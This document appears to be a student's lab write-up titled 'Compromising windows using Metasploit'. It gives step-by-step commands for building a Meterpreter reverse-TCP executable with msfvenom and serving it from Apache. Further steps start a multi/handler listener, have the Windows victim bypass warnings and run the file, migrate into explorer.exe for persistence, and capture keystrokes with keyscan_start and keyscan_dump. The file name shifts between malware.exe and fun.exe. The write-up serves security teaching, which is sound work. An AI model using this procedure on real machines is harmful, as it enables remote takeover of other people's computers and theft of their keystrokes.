# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

PROGRAM:
Find the attackers ip address using ifconfig
OUTPUT:

![Screenshot 2024-04-28 123654](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/b1b123a4-7669-4ca1-9ebd-795d420e1811)

Create a malicious executable file fun.exe using msenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > malware.exe

OUTPUT:

![Screenshot 2024-04-28 123805](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/f5a37ea4-0eb2-48c5-8f56-5bb6cdd35de5)

copy the malware.exe into the apache /var/www/html folder

![Screenshot 2024-04-28 123853](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/3fb5186a-755a-4fd1-a084-b2d2ef22f827)

Start apache server

sudo systemctl apache2 start

![Screenshot 2024-04-28 123955](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/c7d742d5-955b-48a9-b759-bc185285d9db)

Check the status of apache2

![Screenshot 2024-04-28 124100](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/e78ca036-bbb6-453f-8f86-74ddce4fdb34)

Invoke msfconsole:

![Screenshot 2024-04-28 124215](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/08e1fc5a-c2f0-455d-88fe-2fbcc9a0827b)

OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server

use multi/handler

![Screenshot 2024-04-28 124255](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/57c5d6bd-0b56-4856-abaf-20904a94ceb4)

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:

http://192.168.1.2/fun.exe

The file "fun.exe" downloads.

![Screenshot 2024-04-28 124342](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/ff67ae0a-d557-4023-955d-daed09c56c17)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![Screenshot 2024-04-28 124427](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/929d9d97-03d5-4268-80f1-e9a2c13589ff)

To see a list of processes, at the meterpreter > prompt, execute this command:

ps ⇒ can see the fun.exe process running with pid 1156

![Screenshot 2024-04-28 124537](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/b7150f2d-82fe-4e89-b468-b67ce9137f57)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process.

At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:

netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.

Notice the "PID/Program name" value for this connection, which is redacted

![Screenshot 2024-04-28 124632](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/1a2ce2f0-ece5-40ed-8afd-0d33a02c7507)

Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine

keyscan_start Begins capturing keys typed in the target.

On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2024-04-28 124723](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/4d4302cf-2752-4bbf-b716-474e382fe276)

keyscan_dump Shows the keystrokes captured so far

![Screenshot 2024-04-28 124812](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/9c069abc-7f0e-4a6b-ad29-f4af8c53d2cf)



















































## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
